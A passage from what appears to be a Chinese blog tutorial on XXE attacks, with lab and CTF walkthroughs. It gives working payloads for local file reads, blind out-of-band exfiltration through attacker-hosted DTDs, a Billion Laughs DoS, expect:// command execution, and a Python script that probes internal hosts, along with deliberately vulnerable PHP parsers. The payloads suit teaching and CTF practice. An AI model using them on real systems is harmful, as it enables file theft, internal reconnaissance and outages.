&gt;]&gt;&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/root&gt;'</span></span><br><span class="line"></span><br><span class="line">  req = urllib2.Request(url = url,headers = headers, data = xml)</span><br><span class="line"></span><br><span class="line">  res_data = urllib2.urlopen(req)</span><br><span class="line"></span><br><span class="line">  res = res_data.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> res</span><br></pre></td></tr></table></figure>



<h4 id="危害1-读取任意文件"><a href="#危害1-读取任意文件" class="headerlink" title="危害1.读取任意文件"></a>危害1.读取任意文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p>有回显情况:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">  &lt;!DOCTYPE ANY [</span><br><span class="line">  &lt;!ENTITY test SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;E:&#x2F;&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;etc&#x2F;passwd.txt&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">  &lt;abc&gt;&amp;test;&lt;&#x2F;abc&gt;</span><br></pre></td></tr></table></figure>

<p>无回显情况:</p>
<p>　　本次测试用的phpStudy，需<a href="https://blog.csdn.net/fgdfgasd/article/details/17010429" target="_blank" rel="noopener">开启apache日志记录</a>并重启服务。当无回显情况时，可以讲数据发送到远程服务器。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;E:&#x2F;&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;etc&#x2F;passwd.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;localhost&#x2F;evil.xml&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;abc&gt;&lt;&#x2F;abc&gt;</span><br></pre></td></tr></table></figure>

<p>远程服务器部署evil.xml内容为:</p>
<p>  <code>&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#39;http://localhost/?content=%file;&#39;&gt;&quot;&gt; %payload;</code></p>
<p>YWRtaW46OnBhc3N3b3JkIQ0KdGVzdDo6cGFzc3dkIQ==Base64解码即可。</p>
<p>　　通过此方法可以读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件、获取帐号密码后进一步攻击。如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p>
<h4 id="危害2-拒绝服务攻击"><a href="#危害2-拒绝服务攻击" class="headerlink" title="危害2.拒绝服务攻击"></a>危害2.拒绝服务攻击</h4><p>　通过此方法可以读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件、获取帐号密码后进一步攻击。如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p>
<p>危害2.拒绝服务攻击</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">  &lt;!DOCTYPE lolz [</span><br><span class="line">  &lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;</span><br><span class="line">  &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;</span><br><span class="line">  ]&gt;</span><br><span class="line">  &lt;lolz&gt;&amp;lol9;&lt;&#x2F;lolz&gt;</span><br></pre></td></tr></table></figure>

<p>　　此示例就是著名的<a href="https://en.wikipedia.org/wiki/Billion_laughs_attack" target="_blank" rel="noopener">Billion laughs attack</a>该攻击是通过创建一项递归的 XML 定义，在内存中生成十亿个”Ha！”字符串，从而导致 DoS 攻击。</p>
<p>　　原理：构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中，解析非常慢，造成了拒绝服务器攻击。</p>
<h4 id="危害3-远程命令-代码-执行"><a href="#危害3-远程命令-代码-执行" class="headerlink" title="危害3.远程命令(代码)执行"></a>危害3.远程命令(代码)执行</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;abc&gt;&amp;test;&lt;&#x2F;abc&gt;</span><br></pre></td></tr></table></figure>

<p>　　此示例是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能有此漏洞。</p>
<h4 id="危害4-内网信息探测"><a href="#危害4-内网信息探测" class="headerlink" title="危害4.内网信息探测"></a>危害4.内网信息探测</h4><p>　　利用http协议<a href="http://url/file.ext，替换标准poc中相应部分即可,这种情况比较不稳定，根据不同xml解析器会得到不同的回显报错结果。" target="_blank" rel="noopener">http://url/file.ext，替换标准poc中相应部分即可,这种情况比较不稳定，根据不同xml解析器会得到不同的回显报错结果。</a></p>
<p>/etc/hosts</p>
<p>读/proc/net/arp:</p>
<p>有回显情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY test SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:87&#x2F;tets.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;**abc**&gt;&amp;test;&lt;&#x2F;**abc**&gt;</span><br></pre></td></tr></table></figure>

<p>当端口开放时，如80端口：</p>
<p>当端口未开放时，如81端口</p>
<p>无回显情况：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;127.0.0.1:81&#x2F;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;localhost&#x2F;evil.xml&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;**abc**&gt;&lt;&#x2F;**abc**&gt;</span><br></pre></td></tr></table></figure>

<p>远程服务器部署evil.xml内容为:</p>
<p>  &lt;<code>!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#39;http://localhost/?content=%file;&#39;&gt;&quot;&gt; %payload;</code></p>
<p>　　观察日志文件即可。</p>
<p>当端口开放时，如80端口:</p>
<p>当端口未开放时，如81端口</p>
<p>　　有的无回显的情况还可以通过抓包看响应头返回的状态码，返回的报错信息等判断。</p>
<h4 id="危害5-攻击内网网站"><a href="#危害5-攻击内网网站" class="headerlink" title="危害5.攻击内网网站"></a>危害5.攻击内网网站</h4><p>难得搭建环境，就直接引用网上的例子吧：</p>
<p>这个示例是攻击内网strusts2网站，远程执行系统命令。</p>
<p>还可部署bash文件建立监听，获得反弹shellcode等。</p>
<p>由于xml实体注入攻击可以利用http://协议，也就是可以发起http请求。可以利用该请求去探查内网，进行SSRF攻击。</p>
<h4 id="xxe盲注"><a href="#xxe盲注" class="headerlink" title="xxe盲注"></a>xxe盲注</h4><p>先在自己的服务器放置一个e.xml，内容如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;_f14g_Is_Here_.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY trick SYSTEM &#39;http:&#x2F;&#x2F;你的公网ip&#x2F;ftp.txt?id&#x3D;%payload;&#39;&gt;&quot;&gt;</span><br><span class="line">%int;</span><br></pre></td></tr></table></figure>

<p>xml数据如下，但是这里不能连着出现http:，所以讲冒号url编码为%3A</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http%3A&#x2F;&#x2F;你的公网ip&#x2F;e.xml&quot;&gt;%remote;]&gt;</span><br><span class="line">&lt;root&gt;&lt;xxx&gt;&amp;trick;&lt;xxx&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>



<h3 id="实验一：有回显读本地敏感文件-Normal-XXE-https-xz-aliyun-com-t-3357"><a href="#实验一：有回显读本地敏感文件-Normal-XXE-https-xz-aliyun-com-t-3357" class="headerlink" title="*实验一：有回显读本地敏感文件 (Normal XXE) *https://xz.aliyun.com/t/3357"></a>*<em>实验一：有回显读本地敏感文件 (Normal XXE) *</em><a href="https://xz.aliyun.com/t/3357" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357</a></h3><p><strong>xml.php</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (false);</span><br><span class="line">    $xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line">    $dom &#x3D; new DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds &#x3D; simplexml_import_dom($dom);</span><br><span class="line">    echo $creds;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;system.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;&#x2F;creds&gt;</span><br></pre></td></tr></table></figure>

<p><strong>结果如下图：</strong></p>
<p> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7e63e5a-ec17-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002645-e7e63e5a-ec17-1.png" alt="img"></a> </p>
<p> 但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利 </p>
<p><strong>有特殊符号</strong></p>
<p><strong>payload:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;d:&#x2F;test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;&#x2F;roottag&gt;</span><br></pre></td></tr></table></figure>

<p><strong>evil.dtd</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="实验二：无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#实验二：无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="实验二：无回显读取本地敏感文件 (Blind OOB XXE)"></a><strong>实验二：无回显读取本地敏感文件 (Blind OOB XXE)</strong></h3><p><strong>xml.php</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line">$dom &#x3D; new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>test.dtd</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;D:&#x2F;test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;ip:9999?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<p><strong>payload：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e8e966b0-ec17-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e8e966b0-ec17-1.png" alt="img"></a></p>
<p><strong>结果如下：</strong></p>
<p> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e90baeb4-ec17-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e90baeb4-ec17-1.png" alt="img"></a> </p>
<p><strong>整个调用过程：</strong></p>
<p><strong>我们从 payload 中能看到 连续调用了三个参数实体 % remote;% int;% send;，这就是我们的利用顺序，% remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 % int 调用 test.dtd 中的 % file, % file 就会去获取服务器上面的敏感文件，然后将 % file 的结果填入到 % send 以后 (因为实体的值中不能有 %, 所以将其转成 html 实体编码 <code>%</code>)，我们再调用 % send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题</strong></p>
<h3 id="实验三：HTTP-内网主机探测"><a href="#实验三：HTTP-内网主机探测" class="headerlink" title="实验三：HTTP 内网主机探测"></a><strong>实验三：HTTP 内网主机探测</strong></h3><p>我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以 linux 为例），我们可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了</p>
<p><strong>下面是一个探测脚本的实例：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">#Origtional XML that the server accepts</span><br><span class="line">#&lt;xml&gt;</span><br><span class="line">#    &lt;stuff&gt;user&lt;&#x2F;stuff&gt;</span><br><span class="line">#&lt;&#x2F;xml&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def build_xml(string):</span><br><span class="line">    xml &#x3D; &quot;&quot;&quot;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;ISO-8859-1&quot;?&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;!ENTITY xxe SYSTEM &quot;&quot;&quot; + &#39;&quot;&#39; + string + &#39;&quot;&#39; + &quot;&quot;&quot;&gt;]&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;    &lt;stuff&gt;&amp;xxe;&lt;&#x2F;stuff&gt;&quot;&quot;&quot;</span><br><span class="line">    xml &#x3D; xml + &quot;\r\n&quot; + &quot;&quot;&quot;&lt;&#x2F;xml&gt;&quot;&quot;&quot;</span><br><span class="line">    send_xml(xml)</span><br><span class="line"></span><br><span class="line">def send_xml(xml):</span><br><span class="line">    headers &#x3D; &#123;&#39;Content-Type&#39;: &#39;application&#x2F;xml&#39;&#125;</span><br><span class="line">    x &#x3D; requests.post(&#39;http:&#x2F;&#x2F;34.200.157.128&#x2F;CUSTOM&#x2F;NEW_XEE.php&#39;, data&#x3D;xml, headers&#x3D;headers, timeout&#x3D;5).text</span><br><span class="line">    coded_string &#x3D; x.split(&#39; &#39;)[-2] # a little split to get only the base64 encoded value</span><br><span class="line">    print coded_string</span><br><span class="line">#   print base64.b64decode(coded_string)</span><br><span class="line">for i in range(1, 255):</span><br><span class="line">    try:</span><br><span class="line">        i &#x3D; str(i)</span><br><span class="line">        ip &#x3D; &#39;10.0.0.&#39; + i</span><br><span class="line">        string &#x3D; &#39;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;&#39; + ip + &#39;&#x2F;&#39;</span><br><span class="line">        print string</span><br><span class="line">        build_xml(string)</span><br><span class="line">    except:</span><br><span class="line">continue</span><br></pre></td></tr></table></figure>

<p><strong>返回结果：</strong></p>
<p> <a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9a5fb54-ec17-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9a5fb54-ec17-1.png" alt="img"></a> </p>
<h3 id="实验四：HTTP-内网主机端口扫描"><a href="#实验四：HTTP-内网主机端口扫描" class="headerlink" title="实验四：HTTP 内网主机端口扫描"></a><strong>实验四：HTTP 内网主机端口扫描</strong></h3><p>找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把 ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合 burpsuite 进行端口探测</p>
<p><strong>比如我们传入：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE data SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:515&#x2F;&quot; [  </span><br><span class="line">&lt;!ELEMENT data (#PCDATA)&gt;  </span><br><span class="line">]&gt;</span><br><span class="line">&lt;data&gt;4&lt;&#x2F;data&gt;</span><br></pre></td></tr></table></figure>

<p><strong>返回结果：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.bind.UnmarshalException  </span><br><span class="line"> - with linked exception:</span><br><span class="line">[Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException</span><br><span class="line">Exception Description: An error occurred unmarshalling the document  </span><br><span class="line">Internal Exception: ████████████████████████: Connection refused</span><br></pre></td></tr></table></figure>

<p>这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测</p>
<p><strong>如下图所示：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9dea094-ec17-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-e9dea094-ec17-1.png" alt="img"></a></p>
<p> 至此，我们已经有能力对整个网段进行了一个全面的探测，并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接 getshell 的 比如 strus2） </p>
<h3 id="实验五：内网盲注-CTF"><a href="#实验五：内网盲注-CTF" class="headerlink" title="实验五：内网盲注 (CTF)"></a><strong>实验五：内网盲注 (CTF)</strong></h3><p>2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 盲注的，大致的思路如下：</p>
<p>首先在外网的一台 ip 地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错</p>
<p><strong>如图所示：</strong></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-ea03a74a-ec17-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002648-ea03a74a-ec17-1.png" alt="img"></a></p>
<p><a href="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea345868-ec17-1.png" target="_blank" rel="noopener"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002649-ea345868-ec17-1.png" alt="img"></a></p>
<p>既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件 (这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;52dandan.cc&#x2F;public_html&#x2F;config.php</span><br></pre></td></tr></table></figure>

<p>拿到第一部分 flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">define(BASEDIR, &quot;&#x2F;var&#x2F;www&#x2F;52dandan.club&#x2F;&quot;);</span><br><span class="line">define(FLAG_SIG, 1);</span><br><span class="line">define(SECRETFILE,&#39;&#x2F;var&#x2F;www&#x2F;52dandan.com&#x2F;public_html&#x2F;youwillneverknowthisfile_e2cd3614b63ccdcbfe7c8f07376fe431&#39;);</span><br><span class="line">....</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>注意：</strong></p>
<p>这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php<br>过滤器的一个压缩的方法</p>
<p>压缩：echo file_get_contents (“php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd”);<br>解压：echo file_get_contents (“php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1”);</p>
</blockquote>
<p>然后我们考虑内网有没有东西，我们读取</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proc&#x2F;net&#x2F;arp</span><br><span class="line">&#x2F;etc&#x2F;host</span><br></pre></td></tr></table></figure>

<p>找到内网的另一台服务器的 ip 地址 192.168.223.18</p>
